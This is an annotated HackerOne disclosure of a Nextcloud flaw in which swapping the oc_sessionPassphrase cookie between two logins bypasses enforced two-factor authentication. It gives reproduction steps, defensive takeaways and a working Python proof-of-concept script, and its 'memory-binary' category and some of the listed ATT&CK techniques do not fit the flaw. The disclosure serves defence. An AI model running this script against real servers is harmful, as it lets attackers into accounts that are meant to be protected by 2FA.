# Two-Factor Authentication Enforcement Bypass via Session Token Manipulation

## Metadata
- **Source:** HackerOne
- **Report:** 1050244 | https://hackerone.com/reports/1050244
- **Submitted:** 2020-12-04
- **Reporter:** abdullah-a
- **Program:** Nextcloud
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Authentication Bypass, Session Management Flaw, Cryptographic Weakness, Insufficient Session Validation
- **CVEs:** None
- **Category:** memory-binary

## Summary
A critical authentication bypass vulnerability in Nextcloud allows attackers to circumvent 2FA enforcement by manipulating session tokens. An authenticated user can replace the oc_sessionPassphrase cookie from a second login session to gain full access without completing 2FA challenges. This completely undermines the 2FA security mechanism for enforced groups.

## Attack scenario
1. Attacker creates or compromises a user account in a group with enforced 2FA
2. Attacker initiates first login attempt with valid credentials, receives initial session with oc_sessionPassphrase token but blocked at 2FA challenge
3. Attacker opens second browser/session and logs in again with same credentials
4. Attacker extracts the oc_sessionPassphrase cookie from the second session
5. Attacker replaces the oc_sessionPassphrase token from first session with the token from second session
6. Attacker gains full authenticated access to user dashboard, completely bypassing 2FA enforcement

## Root cause
The oc_sessionPassphrase token used for session validation is not cryptographically bound to the 2FA authentication state. The application fails to verify that the session has completed the required 2FA challenge before granting access to protected resources. Session tokens can be freely exchanged between legitimate login attempts without invalidating the 2FA requirement.

## Attacker mindset
Attacker recognizes that session state and 2FA enforcement are tracked separately, identifying that swapping session identifiers can decouple the account from its 2FA requirement. The attacker understands that multiple concurrent sessions are permitted and leverage this design flaw to circumvent security controls.

## Defensive takeaways
- Implement cryptographic binding between session tokens and authentication factors - ensure oc_sessionPassphrase is invalidated if 2FA state changes
- Enforce strict session lifecycle: invalidate previous sessions immediately upon new login attempts from the same user
- Validate 2FA completion status on every request to protected resources, not just at login
- Use opaque, unpredictable session identifiers that cannot be copied between sessions
- Implement session pinning - bind sessions to device fingerprints or IP addresses to prevent token reuse
- Add rate limiting and behavioral detection for multiple simultaneous login attempts
- Log and alert on suspicious session activity patterns like token manipulation

## Variant hunting
Search for similar issues in: other session token fields (oc_sessionId, PHPSESSID), single-session-per-user enforcement gaps, 2FA state stored client-side rather than server-side, concurrent session handling in authentication systems, other apps using cookie-based session management without 2FA state binding

## MITRE ATT&CK
- T1110 - Brute Force
- T1187 - Forced Authentication
- T1556 - Modify Authentication Process
- T1078 - Valid Accounts
- T1550.001 - Use Alternate Authentication Material

## Notes
Report lacks explicit CVE assignment but describes reproducible, critical vulnerability. The authors acknowledge not fully understanding the root cause, suggesting potential deeper flaws in session management architecture. Python PoC script provided demonstrates ease of exploitation. This vulnerability likely affects multiple Nextcloud versions and should be treated as critical due to complete bypass of mandatory security control.

## Full report
<details><summary>Expand</summary>

the attacker could bypass the two-factor authentication enforcement

[ Steps to reproduce ]
1. Login with an Administrator account.
2. Click on your administrator profile icon.
3. Users -> Add group -> group name: Enforcement.
4. New User -> Username: Bypass -> Password: NextCloudEnforcement -> Add User in group -> Enforcement.
5. Click on your administrator profile icon.
6. Settings -> Administration label -> Security -> Two-Factor Authentication -> Enforcement of two-factor authentication can be set for certain groups only. Two-factor authentication is enforced for all members of the following groups. -> Add Enforcement group.
7. Save changes.
8. Logout.
9. Login with Username: Bypass and Password: NextCloudEnforcement the response msg is Two-factor authentication is enforced but has not been configured on your account. Contact your admin for assistance.
10. Login with Username: Bypass and Password: NextCloudEnforcement with another session.
11. replace the oc_sessionPassphrase token with the first oc_sessionPassphrase session.
12. then you have bypassed the two factor authentication enforcement.

[Code]
python script just change the domain to your domain and save as bypass.py
```
#!/usr/bin/python3
# python3 -m pip install requests beautifulsoup4
# python3 bypass.py
from requests import Session
from bs4 import BeautifulSoup

class NextCloud(object):
    def __init__(self, baseURL):
        self.session = Session()
        self.baseURL = baseURL

    def login(self, data):
        response = self.session.get(f'{self.baseURL}/login')
        soup = BeautifulSoup(response.text, 'html.parser')
        data.update({
            'requesttoken': soup.find('head')['data-requesttoken']
        })
        self.session.post(f'{self.baseURL}/login', data = data)
    
    def getCookies(self):
        return self.session.cookies.get_dict()

if __name__ == '__main__':
    baseURL = 'http://nextcloud.diefunction.local'
    data = {
        'user': 'bypass',
        'password': 'NextCloudEnforcement'
    }
    firstSession = NextCloud(baseURL)
    secondSession = NextCloud(baseURL)
    firstSession.login(data)
    secondSession.login(data)
    cookies = firstSession.getCookies()
    cookies['oc_sessionPassphrase'] = secondSession.getCookies()['oc_sessionPassphrase']
    print(f'[Cookies] {cookies}') # change your browser cookies to bypass enforcement
```
change the browser cookies to the script output cookies

[ why its worked ]
I tried to understand why it's worked but I didn't found any reason for that
https://github.com/nextcloud/server/blob/1762a409f954fd9a66e7572704ea9ba7813601b4/core/templates/twofactorselectchallenge.php

[Discovered by]
Abdullah Alharbi @Eng_Abdullahx0
Rayan Althobaiti @Diefunction

Note: if this is an eligible bug please provide a CVE.

## Impact

the attacker can gain access to the user dashboard if the user account is enforced with two-factor authentication

</details>

---
*Analysed by Claude on 2026-05-24*
